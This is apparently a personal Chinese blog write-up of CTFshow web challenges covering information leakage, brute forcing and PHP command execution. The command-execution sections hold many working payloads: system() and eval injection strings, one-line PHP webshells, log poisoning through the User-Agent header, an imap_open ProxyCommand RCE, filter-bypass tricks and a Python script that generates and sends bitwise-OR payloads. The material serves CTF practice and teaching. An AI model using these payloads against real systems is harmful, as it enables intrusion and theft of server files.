---
title: CTFshow_web_WP
tags:
  - web
  - WP
categories:
  - ctfshow
swiper_index: 0
description: 个人对CTFshow_Web写的一些wp总结，不喜勿喷
abbrlink: 8087d2e8
date: 2025-05-19 12:17:31
---

## 信息收集

### web-1

```text
开发者开发不仔细,注释留在了前端界面,通过检查界面源代码发现漏洞和flag,得到的flag可能是编码之前的,所以需要进行base64解码或者其他方式解码
```

### web-2

```text
前端进行限制,无法查看页面源代码或者检查,通过view-source:url可以查看源代码 
通过不断刷新进行F12检查也可以开启代码检查,然后禁用JavaScript
```

### web-3

```text
通过BP抓包,respond返回请求携带信息泄露（flag）
```

### web-4

==#如果是有明显的网站架构，可以优先扫描robots文件==

```text
网页搜索引擎爬取网站的robots(.txt)文件,所以网站robots(.txt)文件也会信息泄露(flag)
```

### web-5

```text
phps文件泄露,若目录扫描到,通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容,所以需要用phps文件代替。用户访问phps文件就能看到对应的php文件的源码。其中可能有flag
```

### web-6

```text
网站管理者处理备份文件不当,在更新网站的过程中留下了网站源码的备份文件 
```

```text
  网站备份压缩文件,漏洞成因,在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。
  当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。
  该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。
  该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。
  被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。
  网站备份文件后缀：.rar .zip .7z .tar.gz .bak .swp .txt
```

### web-7

```text
开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。
```

```text
.gitignore (配置在git进行文件跟踪的时候忽略掉哪些文件 , 从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志/配置文件等敏感文件)
  在一个目录中初始化一个仓库以后 , 会在这个目录下产生一个名叫 .git 的隐藏文件夹（版本库）这个文件夹里面保存了这个仓库的所有版本等一系列信息
```

```text
1. 什么是版本控制？
	版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。简单来说就是用于管理多人协同开发项目的技术。

2. 为什么要有版本控制？
	没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具。（多人开发就必须要使用版本控制）
 
 	使用版本控制之后可以给你带来的一些便利：
● 实现跨区域多人协同开发
● 追踪和记载一个或者多个文件的历史记录
● 组织和保护你的源代码和文档
● 统计工作量
● 并行开发、提高开发效率
● 跟踪记录整个软件的开发过程
● 减轻开发人员的负担，节省时间，同时降低人为错误

3. 常见的版本控制工具
   主流的版本控制器有如下这些：
  ● Git
  ● SVN（Subversion）
  ● CVS（Concurrent Versions System）
  ● VSS（Micorosoft Visual SourceSafe）
  ● TFS（Team
```

### web-8

```text
这题和上一题类似,只不过这一题是SVN文件泄露
```

### web-9

==dirsearch扫描不出这个文件==

```text
vim缓存泄露,在使用vim进行编辑时,会产生缓存文件,如果网站管理员没有删.时可以通过缓存文件来得到原文件,以index.php来说,第一次退出,缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn
```

### web-10

```text
Respond返回Cookie携带flag
```

### web-11

```text
域名解析隐藏信息flag
```

### web-12

```text
不要忘记robots.txt,有时候网站管理者的账号或者邮箱就是密码
```

### web-13

```text
多在网页点点，特别是网页底部，不要过于相信dirsearch
```

### web-14

```text
网页源码泄露路径,editor编辑框的上传文件里面的文件空间会泄露整个服务器文件系统，拿到网站的flag
```

### web-15

```text
网站管理者邮箱泄露信息，通过邮箱的信息收集可能回答出密保问题
```

### web-16

```text
默认探针为tz.php,里面可以对数据库密码进行测试，也含有phpinfo，phpinfo里面可以查看当前php的环境变量和一些函数，从而得到flag
```

### web-18

```text
查看js文件,发现Unicode编码文件,可以F12直接console改js数值   sorce=130;game_over=false;执行run()拿到110.php,拿到flag
```

### web-19

==只要是前端验证，都可以通过bp进行抓包改包==

```text
不要忘记burp，只要是前端验证，都可以通过bp进行抓包改包，前端的js代码很重要，可以掌控很多事情，很多地方也是通过前端进行验证的,多多尝试编码格式，我这道题的编码格式是Hex
```

### web-20

```text
mdb数据库文件泄露，mdb是早期的access和asp数据库，后缀是mdb，也别忘记在扫描出的目录后面接着扫描
```

### web-21

```text
sql文件泄露,可以用Navicat打开
```



## 爆破

### web-21

```text
在类似表单提交的应用中
表单数据请求应为：
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Basic 后面为数据,我这道题的内容格式(一般需要进行Base64解码)为(username):(password)
我们对YWRtaW46cGFzc3dvcmQ=进行设置攻击变量
这道题因为给的字典只有密码所以猜测username是admin
所以在payload处理添加规则固定前缀是admin:(这里是表单数据格式)和base64编码(因为前端拦截数据进行了编码)
因为我们前面添加规则对我们的数据进行base64编码了，则在payload编码处取消编码，免得二次编码

进行攻击：
状态码200成功回显，拿到flag
```

### web-22

```text
 360quake 使用空间搜索引擎360quake 搜索语法domain="ctf.show" 可以搜索出子域名vip.ctf.show 可以发现子域名vip.ctf.show下面有flag--->flag{ctf_show_web}
```

### web-23

```python
方法1：
进入靶场后测试token=1--->http://37c4bbc1-3a2d-4e5a-a812-13a0db1e1793.challenge.ctf.show/?token=1 然后进入intruder模块 给1添加payload 开始爆破 发现第422位和第1202位长度不同 得知十分的不对劲 点进去响应包发现有flog--->ctfshow{f9bebf73-0d20-4d9d-a196-76390fe945d7}

方法2：
写一个脚本让它算出来实际的值
通过给出的源代码可知，我们要传入一个参数(token)的值
算出token的md5的值将第2位与第15位比较，第15位与18位比较(2位=15位=18位)
再算md5的整数值，(第2位+第15位+第18位)/(第2位)=(第32位)则拿到flag

编写脚本：
import hashlib  # 导入 hashlib 模块以便使用哈希函数

def is_valid_token(token):
    # 计算给定 token 的 MD5 哈希值，并将其转换为十六进制字符串
    md5_hash = hashlib.md5(token).hexdigest()
    
    # 检查哈希值的特定字符是否相等
    if (md5_hash[1] == md5_hash[14] == md5_hash[17]):
        # 将哈希值的第二个字符转换为十六进制整数
        x = int(md5_hash[1], 16)
        
        # 检查 (3 * x) / x 是否等于哈希值的最后一个字符的十六进制整数
        if (3 * x) / x == int(md5_hash[31], 16):
            return True  # 如果条件满足，返回 True，表示 token 有效
    
    return False  # 如果条件不满足，返回 False，表示 token 无效

# 遍历从 0 到 999999 的所有整数，尝试作为 token
for i in range(1000000):
    # 将整数 i 转换为字符串并编码为字节，作为 token
    token = str(i).encode()
    
    # 检查生成的 token 是否有效
    if is_valid_token(token):
        print(f"Valid token found: {i}")  # 打印找到的有效 token
        break  # 找到有效 token 后退出循环


```

==一定要有自己读代码的能力和写脚本的能力==

#### inval函数说明

```php
intval() 函数用于获取变量的整数值。

intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。
PHP 4, PHP 5, PHP 7

语法
int intval ( mixed $var [, int $base = 10 ] )
参数说明：

$var：要转换成 integer 的数量值。
$base：转化所使用的进制。
如果 base 是 0，通过检测 var 的格式来决定使用的进制：

如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
将使用 10 进制 (decimal)。
返回值
成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。

最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。
字符串有可能返回 0，虽然取决于字符串最左侧的字符。
    
<?php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34
echo intval('042');                   // 42
echo intval(1e10);                    // 10000000000
echo intval('1e10');                  // 10000000000
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
?>
```

### web-24

```text
这里要注意 需要知道伪随机数的概念 如果随机数种子定了 那么产生的随机数就是确定的 这里有个坑 php版本不一定要和靶场一样 网上找一个那种php在线运行环境即可

phpstudy的目录索引功能的开启不是要删除目录首页读取的，只用删除文件里面的目录首页就可以了
```

#### mt_rand函数说明

```text
高版本已经弃用了这个函数，因为这个函数生成的是伪随机数，会根据系统生成随机数，只要随机数种子固定，生成的这个随机数也是固定的
如果再次调用的话会再次进行伪随机
```

[根据随机数爆出随机种子](https://www.openwall.com/php_mt_seed/ "https://www.openwall.com/php_mt_seed/ ")这个工具我下载在了kali上，以下是它的用法：

### web-25

```text
根据源码可知，开始令r=0可以得到一个随机数，但是后面要修改token的cookie使之等于第二次随机数和第三次随机数之和
Cookie: token=随机数之和
使用php_mt_seed爆出随机种子
```

![php_mt_seed_kali](posts/8087d2e8/images/php_mt_seed_kali.webp)

### web-26

==多bp手动抓包，然后观察正常页面没有的页面（这题是checkdb.php），虽然不一定能访问，但是能分析==

```text
正常爆破数据库密码就行了
```

### web-27

==不要用单一浏览器抓包,Chrome>firefox>edge==

```text
先登录界面，发现有爆破信息(给了一部分学生信息),又有爆破点(学生信息查询界面),尝试对学生信息进行爆破
用burp抓包post请求，修改post请求，进行日期爆破

日期格式：yyyyMMdd	#y:年份,M:月份,d:天
抓取回显长度不同的Unicode解码
拿到学号和密码进入系统,拿到flag

\u989d\nsdsd9\:一般都是Unicode编码
```

### web-28

```text
302状态码：
HTTP 状态码 302 表示临时重定向（Found），即客户端请求的资源暂时位于另一个 URL，且未来的请求可能会继续使用原始 URL。

302 状态码的作用：
临时重定向：当服务器返回 302 响应时，它告诉客户端请求的资源已被暂时移至新的 URL，但这个移动是临时的。客户端在将来仍然应该继续使用原始 URL 进行请求。
搜索引擎优化（SEO）：与 301 永久重定向不同，302 重定向通常不会影响搜索引擎对原始 URL 的排名，因为它表明资源将在未来可能恢复使用原 URL。因此，搜索引擎不会将排名从旧 URL 转移到新 URL。
浏览器行为：当浏览器收到 302 响应时，它会自动重定向到新的 URL，但在以后的请求中仍然使用原 URL。
例子：
假设你访问了 http://example.com/page，服务器返回 302 状态码并提供一个临时的新 URL http://example.com/temporary-page，那么浏览器会跳转到新 URL，但它会继续使用原 URL 进行后续请求。

302 与 301 区别：
302 是临时重定向，意味着资源可能会在未来恢复使用原 URL，搜索引擎排名不会发生变化。
301 是永久重定向，意味着资源已永久迁移到新 URL，搜索引擎会将排名转移到新 URL。
常见场景：
维护模式：如果网站正在进行维护，临时将访问者重定向到一个维护页面，之后会恢复正常页面。
A/B 测试：网站可能会临时将流量导向不同的页面版本进行测试，测试结束后会恢复使用原 URL。
临时内容变化：当一个资源的内容或位置暂时改变时，使用 302 重定向指向新的位置，未来可能恢复原地址。

302 和其他临时重定向的区别：
301 与 302 都是重定向状态码，但 302 更明确地表示资源是临时的。
也有其他类似的临时重定向状态码，如 303 (See Other) 和 307 (Temporary Redirect)，它们在行为上有一些细微的不同，但整体上都表示重定向是临时的。
总的来说，302 状态码适用于当你知道资源位置会发生变化，但又不想立即影响搜索引擎排名时。
```

```text
这道题是将302重定向回到了原url，然而原url也没有此资源，结果又重定向到新url，新url又重定向到原url，就一直循环

这道题我们要将请求的资源去掉进行攻击，也就是2.txt去掉，这样无法的访问的就返回403，就成功找到了url，拿到flag
```

## 命令执行

### web-29

**可以使用php伪协议进行绕过**

```text
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
其中?>代替分号
```

**也可以使用linux命令直接查看**

```text
?c=system("tac%20fla*"); 
#这个;千万不要忘记
#如果进行了文件黑名单可以使用*绕过

cat $(ls | head -n 1)
head -n 1：获取列表中的第一个文件。

用egrep效果一样egrep=grep  -E
?c=system("cat fl*g.php | grep  -E 'fl.g' ");
?c=system("cat fl*g.php");

倒序输出文本
?c=system("tac fl*g.php");
复制文本至a.txt
?c=system("cp fl*g.php a.txt ");
访问/a.txt
直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码
c=system('echo -e " <?php \n error_reporting(0); \n  \$c= \$_GET[\'c\']; \n eval(\$c); " > a.php');
/a.php?c=system("tac flag.php");
```

==eval函数不支持数组，所以这题不适用数组绕过==

**也可以使用一句话木马**

```text
?c=eval($_POST['yyssh']);
eval函数里面再包含eval
```

### web-30

**与上一题类似**

#### php执行系统命令函数

###### system

```introduce
说明：执行外部程序并显示输出资料。
语法：string system(string command, int [return_var]);
返回值: 字符串

详细介绍：
本函数就像是 C 语中的函数 system()，用来执行指令，并输出结果。若是 return_var 参数存在，则执行 command 之后的状态会填入 return_var 中。同样值得注意的是若需要处理用户输入的资料，而又要防止用户耍花招破解系统，则可以使用 EscapeShellCmd()。若 PHP 以模块式的执行，本函数会在每一行输出后自动更新 Web 服务器的输出缓冲暂存区。若需要完整的返回字符串，且不想经过不必要的其它中间的输出界面，可以使用 PassThru()。
```

```e.g.
$last_line = system("ls", $retval);
echo "Last line of the output: " . $last_line;
```

###### exec和shell_exec

```introduce
说明：执行外部程序。
语法：string exec(string command, string [array], int [return_var]);
返回值: 字符串

详细介绍：
本函数执行输入 command 的外部程序或外部指令。它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用 PassThru() 这个函数。

要是参数 array 存在，command 会将 array 加到参数中执行，若不欲 array 被处理，可以在执行 exec() 之前呼叫 unset()。若是 return_var 跟 array 二个参数都存在，则执行 command 之后的状态会填入 return_var 中。

值得注意的是若需要处理使用者输入的资料，而又要防止使用者耍花招破解系统，则可以使用 EscapeShellCmd()。
```

```e.g.
echo exec("whoami");
?>
```

###### popen

```introduce
popen函数
说明：打开文件。
语法：int popen(string command, string mode);
返回值: 整数

详细介绍：
本函数执行指令开档，而该文件是用管道方式处理的文件。用本函数打开的文件只能是单向的 (只能读或只能写)，而且一定要用 pclose() 关闭。在文件操作上可使用 fgets()、fgetss() 与 fputs()。若是开档发生错误，返回 false 值。
```

```e.g.
$fp = popen( "/bin/ls", "r" );
```

###### passthru

```introduce
原型：function passthru(string $command,int[optional] $return_value)

知识点：passthru与system的区别，passthru直接将结果输出到游览器，不返回任何值，且其可以输出二进制，比如图像数据。
```

###### proc_open()

```text
<?php
// 要执行的命令
$cmd = "ls -l";  // 这个命令会列出当前目录下的所有文件及其详细信息

// 定义描述符，指定标准输入（stdin）、标准输出（stdout）、标准错误输出（stderr）
$descriptorspec = array(
    0 => array("pipe", "r"),  // 标准输入，写入数据到进程
    1 => array("pipe", "w"),  // 标准输出，从进程读取数据
    2 => array("pipe", "w")   // 标准错误输出，读取错误信息
);

// 用于接收进程的输入输出管道
$pipes = array();

// 启动进程
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    // 从标准输出读取数据
    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);  // 关闭标准输出管道

    // 获取进程的返回值
    $return_value = proc_close($process);

    // 输出命令执行结果
    echo "Command Output: " . $output . "\n";
    echo "Return Value: " . $return_value . "\n";
} else {
    echo "Failed to start the process.\n";
}
?>
```

###### pcntl_exec()

```text
使用条件：Linux、安装且启用了pcntl插件

pcntl_exec(string $path, array $args = ?, array $envs = ?): void
<?php
$path = '/usr/bin/ping';
$arg =  ['-c','1','example.com'];
pcntl_exec($path,$arg);
```

###### imap_open(低版本可能存在，高版本已被修复)

```text
imap_open(string $mailbox,……)
<?php
$payload = "echo hello|tee /tmp/executed";
$encoded_payload = base64_encode($payload);
$server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
@imap_open('{'.$server.'}:143/imap}INBOX', '', '');
```



###### 反撇号`（和~在同一个键）执行系统外部命令

```introduce
知识点：在使用这种方法执行系统外部命令时，你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。

安全性说明
　　当你使用这些函数执行命令时，如果是根据用户提交数据作为执行命令的话，你需要考虑系统安全性，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。
```

```e.g.
  echo `dir`;
```

#### 开发人员查看文件内容

###### show_source(scandir(".")[0]);

```introduce
在 PHP 中，show_source() 函数用于输出指定文件的源代码。它可以帮助开发人员查看文件的内容，通常用于调试或学习目的。scandir() 函数则用于返回指定目录中的文件和目录列表。

让我们逐步解析你提供的代码 show_source(scandir(".")[0]);：

scandir()：这个函数用于扫描指定目录并返回该目录中文件和子目录的数组。它的第一个参数是目录路径。
"."：表示当前工作目录。调用 scandir(".") 将返回当前目录中的所有文件和目录。

scandir(".")[0]
[0]：这是数组的索引访问，表示获取 scandir() 返回的数组中索引为 0 的元素。

show_source()
show_source(filename)：此函数接受一个文件名作为参数，并输出该文件的源代码。它会以 HTML 格式显示源代码，并且可以高亮显示语法。
```

###### highlight_file(next(array_reverse(scandir("."))));

```introduce 
array_reverse()：该函数接受一个数组并返回该数组的反转版本。也就是说，数组的最后一个元素将变为第一个，依此类推。

next()：这个函数用于将数组指针向前移动一个位置，并返回当前指针所指向的元素。它会影响数组的内部指针。
假设我们对反转后的数组使用 next()，如果数组是：
Array
(
    [0] => "dir1"
    [1] => "file2.php"
    [2] => "file1.php"
)
调用 next() 后，当前指针将指向 "file2.php"，并返回这个值。

highlight_file(filename)：这个函数接受一个文件名作为参数，并输出该文件的源代码，同时以 HTML 高亮显示。这个函数通常用于调试和查看 PHP 文件的内容。
```

### web-31

###### show_source(next(array_reverse(scandir(pos(localeconv())))));

```introduce
localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是"."

current()返回数组中的单元，默认取第一个值：
pos()：这个函数用于返回数组的第一个值，并将内部指针移到数组的第一个元素。它可以用于获取数组的第一个元素。
pos是current的别名

如果都被过滤还可以使用reset()，该函数返回数组第一个单元的值，如果数组为空则返回 FALSE
```

###### ?c=\$f=glob("f*");show_source($f[0]);

```introduce
glob()：这个函数用于根据给定的模式查找文件路径。它返回一个数组，其中包含与模式匹配的文件名。
"f*"：这是一个通配符模式，表示匹配所有以字母 f 开头的文件名。例如，它可能匹配到 file1.txt、foo.php 等文件。
```

```e.g.
假设当前目录包含以下文件：
file1.txt
foo.php
bar.txt

调用 glob("f*") 将返回一个数组：
Array
(
    [0] => "file1.txt"
    [1] => "foo.php"
)
```

==获取绝对路径可用的有`getcwd()`和`realpath('.')`所以我们还可以用`print_r(scandir(getcwd()));`输出当前文件夹所有文件名==

如果要获取的数组是最后一个我们可以用：

```php
show_source(end(scandir(getcwd())));
```

ps：**`readgzfile()`也可读文件，常用于绕过过滤**

```text
 readgzfile() 可用于读取非 gzip 格式的文件; 在这种情况下，readgzfile() 将直接从文件中读取而不进行解压缩。
```



### web-32

###### php中不需要（）的函数

```e.g.
echo 123;
print 123;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "etc/passwd";
```

###### 换一种方法的UA注入

```e.g.
url/?c=include$_GET[1]?%3E&1=../../../../var/log/nginx/access.log
/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可
```

### web-33

```text
跟上一道题一样的注入，但是解释一下为什么这后面的.不会被过滤
因为preg_match函数只过滤前面变量c的内容，对变量1的内容不进行过滤
```

```text
这个协议也可以换成php://input
改变请求，再加一个请求主体

data://text/plain,后面接一句话木马或者注入内容
```

### web-34\35\36

```text
和上一关一样
```

### web-37\38

```text
这关其实换汤不换药，把命令执行换成了include，但是依然可以UA一句话木马
或者伪协议data://text/plain,
```

### web-39

```text
这关因为在get请求数据后面衔接.php所以不能进行编码绕过
#因为是先进行衔接再进行data流解析

所以直接输入data://text/plain,<?php @eval($_POST['yyssh'])?>
因为include只解析<php包含内容>，当然也可以用//把后面的部分给注释掉
```

### web-40

##### GET和POST请求分离

```text
这道题过滤的其实是中文括号，所以可以用无参数命令绕过
show_source(next(array_reverse(scandir(pos(localeconv())))));

?c=eval(next(reset(get_defined_vars())));&1=system("tac%20flag.php");
这里采用自变量偏移，先在前面偏移一个变量，然后再自己设置变量1，将next指针指向了system这段函数

get_defined_vars()：这个函数返回当前作用域中定义的所有变量的数组。
reset()：重置数组的内部指针，返回数组的第一个元素。
next()：将内部指针向前移动一个位置，并返回当前指针所指向的元素。

```

==他这道题还隐藏着一个什么都没有过滤的POST(参数都没有，可以直接写入)的请求==

```text
?c=print_r(get_defined_vars());
//打印当前作用域有哪些数组

发现一个POST请求数组，发现可以随意写入，没有参数
1=phpinfo();

GET: ?c=eval(array_pop(next(get_defined_vars())));
POST: 1=system('tac flag.php');
执行任意命令
```

### web-41

#### 执行常见系统命令/函数

```text
常见的系统命令可以进行命令执行：
awk  格式：awk'{printf $0;}'flag.php || 该命令意思是其全局检索flag.php内容并输出
cat/tac  读取，tac是cat的倒向读取
nl  读取文件，并在文件的每一行前面标上行号
vi/vim  编辑器，可以实现查看文件
od  二进制方式读取文件内容
more  类似于cat
mv/cp 复制，但是可以通过复制的文件输出 
file -f 报错出具体内容
uniq 也可以读取文件内容，但是会去重
ls  读目录
```

#### Exp脚本编写

```text
这道题实行了严格的过滤,对所有的数字、字母、以及大部分字符标点符号，但是遗留了||按位或运算符
所以这道题的绕过想法是将没有被过滤的代码进行按位或运算生成一个命令执行字符串
首先第一步筛选出没有被过滤的字符，然后将没有被过滤的字符进行按位或运算，得到新的字符
因为没有被过滤的字符还有很多，生成的新字符也有很多，所以这里我们采用编写脚本
```

**生成字符**

```php
<?php
$myfile = fopen("rce_or.txt", "w");	//将字符写入文本中
    $contents="";
    for($i=0;$i<256;$i++)
    {
        for($j=0;$j<256;$j++)	//将所有的ASCII码值筛选出来
        {						
            if($i<16)
            {
                $hex_i='0'.dechex($i);	//进行十六进制编码
            }
            else
            {
                $hex_i=dechex($i);
            }
            if($j<16)
            {
                $hex_j='0'.dechex($j);
            }
            else
            {
                $hex_j=dechex($j);
            }
            $preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
            if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))
            {		//筛选没有被过滤的字符串
                echo "";
            }
            else
            {
                $a='%'.$hex_i;	//将这些字符串进行URL编码
                $b='%'.$hex_j;
                $c=(urldecode($a)|urldecode($b));	//解码之后进行按位或运算
                if (ord($c)>=32&ord($c)<=126) 		//如果可以打印出来则记录进文本中
                {
                    $contents=$contents.$c." ".$a." ".$b."\n";
                }
            }
        }
    }	//这里为什么不把contents每一次都置0，因为最后只记录一次contens进入文本(所以对contents进行累加)
	fwrite($myfile,$contents);
	fclose($myfile);
?>

```

**拿到我们想要的新字符,可以进行RCE的，这里我们用system来进行举例**

```text
这里有两种办法，一种是去文本文件里面，直接搜索我们要的新字符，然后一个一个写入
还有一种是通过编写脚本，帮助我们查询新字符，并合成字符串，发送至URL
```

**查询字符**

```python
import urllib	#对POST传入数据进行URL编码
import requests	#发送POST请求
from sys import *	#读取用户传入参数
import os	#执行前面的生成字符文件

os.system("php web22.php")	#执行前面的生成字符文件
if len(argv)!=2 :	#判断用户输入是否正确
    print("-" * 50)
    print("你输入的不正确")
    print("输入格式为：python 脚本名 url")
    exit(0)
url=argv[1]	#根据用户输入的值，进行URL赋值

def action(act):	#查询并合成新字符函数
    s1=""
    s2=""
    f=open("rce_or.txt","r",encoding="UTF-8")
    for i in act:
        f.seek(0)   #让每一次文件都从头开始查找
        for line in f:
            Acm=line
            # Acm=line.split(" ")   //不能用用空格分隔，有些未被过滤的字符也被分隔了
            cm=Acm[0]
            if cm==i:
                s1+=Acm[2:5]	#从第2个开始读取到第4个
                s2+=Acm[6:9]
                break
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"	#括号引起来的操作，方便进行或运算("s1"|"s2")
    print(output)
    f.close()
    return output

while True:
    param=action(input("RCE_function:"))+action(input("Command:"))
    data={
        'c':urllib.parse.unquote(param)	#这里必须用URL解码，不然浏览器会对数据再一次URL编码
    }
    r=requests.post(url,data=data)
    print(f"Web41_flag:\n{r.text}")
```

==这里systemls不用加;(分号)，最开始进行按位或运算，已经把这段代码当作php代码执行了==

**对上面一些函数的解释**

###### argv

```text
argv是sys库的一个函数
argv[0]：脚本名	argv[1]:用户输入的第一个参数
```

###### urllib.parse.unquote

```text
对参数进行URL解码
```

### web-42

```text
采用将命令输出重定向的黑洞(/dev/null)的过滤
我们可以采用命令分隔符把后面的命令重定向，前面的命令照常输出
```

#### 命令分隔符

```text
; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
& //两条命令都会执行
&& //两条命令都会执行
```

### web-43/44

```text
钱白花了，就是跟前面一样的cat和flag过滤，运用*或者tac就可以绕过了
```

### web-45

==空格绕过新知识==

```text
${IFS}绕过：在linux下，${IFS}是分隔符的意思，所以可以有${IFS}进行空格的替代。

$IFS$9绕过：$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割。
```

###### 讲解一下这个IFS

```text
IFS在Linux中就是一个系统变量，$IFS就表示分隔符，但是单纯的cat$IFS2,无法输出，是因为系统把IFS2整体当作变量了
所以可以使用{IFS}把这个变量名给固定住，cat${IFS}2,成功执行
如果{}被过滤则可以cat$IFS$9,$9系统变量空字符串打断IFS的变量名，cat$IFS$92,也可以成功执行
```

```e.g.
cat flag.txt
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
{cat,flag.txt}
```

### web-46\47\48\49\50\51

```text
*号被过滤，可以用?号\号''号替代
cat fl?g.php
cat fla\g.php
cat flag''g.php

命令过滤绕过
ca''t flag.php
ca\t flag.php

其他的跟前面一样
```

### web-52\53\54

```text
这题阴了一手，过滤还是常规过滤，但是flag在根目录下
补充：
ls如果展开是一个路径的话，说明这个东西是一个文件
```

### web-55/56

```text
由于题目没有过滤掉数字,所以才用linux自带的base64编码输出，将flag输出
payload:
?c=/???/????64 ????.???
意思为：?c=/bin/base64 flag.php

?c=/???/???/????2 ????.???
意思为：?c=/usr/bin/bzip2 flag.php

最后访问url/flag.php.bz2即可
```

还可以通过$命令执行

```text
$'...' 是 Bash 中的一个特性，表示支持特殊字符（比如通过八进制、十六进制或 Unicode 字符）的字符串。
payload:
$'\164\141\143' $'\146\154\141\147\56\160\150\160'
意思是：tac flag.php
```

#### /bin/sh命令执行

```text
因为在linux里面.就代表sh命令
sh命令我们就理解为打开终端
然后我们自己上传一个文件，这个文件会产生一个临时文件在tmp目录下
我们用sh命令打开这个临时文件，文件内容就是命令输入，这样就会造成sh执行注入命令
```

首先拿到这个网页的文件上传模板，先构造一个文件上传，然后burp抓包

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>

<body>
    <form action="http://4db3939d-5503-445b-9328-124df867dd3e.challenge.ctf.show/" method="post"
        enctype="multipart/form-data">
        <!--链接是当前打开的题目链接-->
        <label for="file">文件名：</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
    </form>
</body>

</html>

```

![图片上传模板](posts/8087d2e8/images/UploadMode.webp)

然后通过修改这个数据包，达到命令执行

这里说一下php临时文件的命名规则

Windows下的大多都是phpxxxxxx.tmp，linux下的大多都是phpxxxxxx

因为x的有大小写字母，我们可以直接先固定住一个字符，然后全体通配符匹配，????????[@-[]固定住最后一个字符为大写字符进行匹配

```text
构造GET参数payload为：
?c=.%20/???/????????[@-[]
意思为：?c=. /tmp/phpxxxxxx	
.%20表示可以直接执行文件，所以下面不加#！/bin/sh也可以执行
网页文件tmp目录大以/phpxxxxxx结尾
也有可能是小写字母，所以没回显的话，需要多尝试，[@-[]表示@到[之间的字符，这里是包括所有大写字母

构造POST参数payload为：
#!/bin/sh
cat flag.php
```

### web-57

```text
这题属于知识拓展,$(())=0,$((~$(())))=-1,里面默认式子相加也就是
$((~$(()))~$(()))))=-1+(-1)=-2
这题要我们构造出36也就是将-37进行取反，他这里取反会少一，原理是二进制的按位取反
这里我们采用多在虚拟机上实验
然后用python脚本构造payload	#总不能自己手打37个吧,脚本的作用就是替代重复的工作
```

### web-58\59

```text
没有过滤include,可以使用include加php伪协议绕过

使用c=copy("flag.php","flag.txt")
renama，highlight_file,show_source这些函数都没有被过滤
```

### web-60/61/62

##### php扫描文件

```text
c=print_r(scandir(dirname('_FILE_')));
```

##### 查看目录

```text
c=print_r(scandir("路径"));
c=print_r(scandir(".."));
c=var_dump(scandir("路径"));
```

### web-63

```text
